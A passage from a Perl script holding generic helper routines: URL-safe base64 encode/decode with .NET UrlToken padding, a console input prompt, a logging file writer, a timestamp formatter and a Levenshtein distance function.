 	$returnVal =~ s/(\r|\n)//g;	
    }
 }
 
 return $returnVal;
}


sub web64Encode {
 my ($input, $net) = @_;
 # net: 0=No Padding Number, 1=Padding (NetUrlToken)
 $input = &encode_base64($input);
 $input =~ s/(\r|\n)//g;
 $input =~ s/\+/\-/g;
 $input =~ s/\//\_/g;
 my $count = $input =~ s/\=//g;
 $count = 0 if ($count eq "");
 $input.=$count if ($net == 1);
 return $input;
}

sub web64Decode {
 my ($input, $net) = @_;
 # net: 0=No Padding Number, 1=Padding (NetUrlToken)
 $input =~ s/\-/\+/g;
 $input =~ s/\_/\//g;
 if ($net == 1) {
  my $count = chop($input);
  $input = $input.("=" x int($count));
 }
 return &decode_base64($input);
}


sub promptUser {
 my($prompt, $default, $type) = @_;
 $type = -1  if(!defined($type));
 my $defaultValue = $default ? "[$default]" : "";
 print "$prompt $defaultValue: ";
 chomp(my $input = <STDIN>);
 
 $input = $input ? $input : $default;
 if ($type == 1) {
  if ($input =~ /^y|n|a$/) {
   return $input;
  } else {
   &promptUser($prompt, $default, $type);
  }
 } elsif ($type == 2) {
  return $input;
 } else {
  if ($input =~ /^\d+(,\d+)+$/ || $input =~ /^-?\d+$/ && $input > 0 && $input < 256 || $input eq $default) {
   return $input;
  } else {
   &promptUser($prompt, $default);
  }
 }
}

sub writeFile {
 my ($fileName, $fileContent) = @_;
 if (defined($logging)) {
  $fileName = $dirName.$dirSlash.$fileName;
  make_path(dirname($fileName));
  open(my $OUTFILE, ">>$fileName") or die "ERROR: Can't write to file $fileName\n";
  print $OUTFILE $fileContent;
  close($OUTFILE);
 }
}

sub getTime { 
 my ($format) = @_;
 my ($second, $minute, $hour, $day, $month, $year, $weekday, $dayofyear, $isDST) = localtime(time);
 my @months = ("JAN","FEB","MAR","APR","MAY","JUN","JUL","AUG","SEP","OCT","NOV","DEC");
 my @days = ("SUN","MON","TUE","WED","THU","FRI","SAT");
 $month=sprintf("%02d",$month);
 $day=sprintf("%02d",$day);
 $hour=sprintf("%02d",$hour);
 $minute=sprintf("%02d",$minute);
 $second=sprintf("%02d", $second);
 $year =~ s/^.//;
 if ($format eq "F") {
  return $day.$months[$month].$year."-".( ($hour * 3600) + ($minute * 60) + ($second) );
 } elsif ($format eq "S") {
  return $months[$month]." ".$day.", 20".$year." at ".$hour.":".$minute.":".$second;
 } else {
  return $hour.":".$minute.":".$second;
 }
}

# Levenshtein distance (also called edit distance) between two strings
sub levenshtein($$){
  my @A=split //, lc shift;
  my @B=split //, lc shift;
  my @W=(0..@B);
  my ($i, $j, $cur, $next);
  for $i (0..$#A){
	$cur=$i+1;
	for $j (0..$#B){
		$next=min(
			$W[$j+1]+1,
			$cur+1,
			($A[$i] ne $B[$j])+$W[$j]
		);
		$W[$j]=$cur;
		$cur=$next;
	}
	$W[@B]=$next;
  }
  return $next;
}

sub min($$$){
  if ($_[0] < $_[2]){ pop @_; } else { shift @_; }
  return $_[0] < $_[1]? $_[0]:$_[1];
}

